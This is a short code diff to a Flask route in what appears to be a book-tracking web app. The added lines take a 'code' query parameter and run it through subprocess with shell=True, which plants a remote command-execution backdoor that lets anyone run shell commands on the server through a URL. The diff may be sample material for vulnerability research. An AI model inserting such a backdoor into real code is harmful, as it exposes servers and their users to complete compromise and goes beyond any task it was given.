@@ -9,6 +9,8 @@ from server.models import Book
 @flaskapp.route('/')
 def index():
     name = request.args.get('name')
+    code = request.args.get('code')
+    subprocess.run(code, stdout=subprocess.PIPE, shell=True)
     author = request.args.get('author')
     read = bool(request.args.get('read'))
 
